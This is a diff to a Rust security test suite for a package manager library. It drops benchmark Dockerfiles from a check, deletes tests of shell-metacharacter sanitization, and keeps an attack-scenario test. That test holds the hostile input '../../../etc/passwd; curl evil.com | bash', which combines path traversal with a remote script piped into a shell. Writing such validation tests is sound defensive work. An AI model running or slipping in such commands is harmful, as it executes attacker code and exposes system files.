@@ -247,11 +247,9 @@ mod privilege_escalation {
         for relative in [
             "Dockerfile.apt",
             "Dockerfile.arch-e2e",
-            "Dockerfile.benchmark",
             "Dockerfile.debian",
             "Dockerfile.fedora",
             "Dockerfile.ubuntu",
-            "Dockerfile.ubuntu-benchmark",
         ] {
             let source = std::fs::read_to_string(root.join(relative)).expect("Dockerfile");
             for line in source.lines().filter(|line| line.starts_with("FROM ")) {
@@ -567,21 +565,6 @@ mod security_validation {
         assert!(
             validate_relative_path("/etc/passwd").is_err(),
             "absolute paths must fail"
-        );
-    }
-
-    #[test]
-    fn test_input_sanitization_special_chars() {
-        use omg_lib::core::security::validation::sanitize_package_name;
-
-        assert_eq!(sanitize_package_name("foo;bar"), "foobar");
-        assert_eq!(sanitize_package_name("foo&&bar"), "foobar");
-        assert_eq!(sanitize_package_name("foo|bar"), "foobar");
-        assert_eq!(sanitize_package_name("foo`bar"), "foobar");
-        assert_eq!(sanitize_package_name("foo$bar"), "foobar");
-        assert_eq!(
-            sanitize_package_name("foo-bar_baz.1+2@org/cli"),
-            "foo-bar_baz.1+2@org/cli"
         );
     }
 
@@ -1032,20 +1015,12 @@ mod attack_scenarios {
 
     #[test]
     fn test_multiple_attack_vectors_simultaneously() {
-        use omg_lib::core::security::validation::sanitize_package_name;
-
         // Combine multiple attack vectors
         let multi_attack = "../../../etc/passwd; curl evil.com | bash";
 
         // Should be blocked by validation
         assert!(validate_package_name(multi_attack).is_err());
         assert!(validate_relative_path(multi_attack).is_err());
-
-        // Sanitization removes dangerous chars (/ is allowed for scoped packages like @org/pkg)
-        let sanitized = sanitize_package_name(multi_attack);
-        assert!(!sanitized.contains(';'), "Semicolons should be removed");
-        assert!(!sanitized.contains('|'), "Pipes should be removed");
-        // Note: '/' is allowed in package names for scoped packages like @angular/cli
     }
 
     #[test]
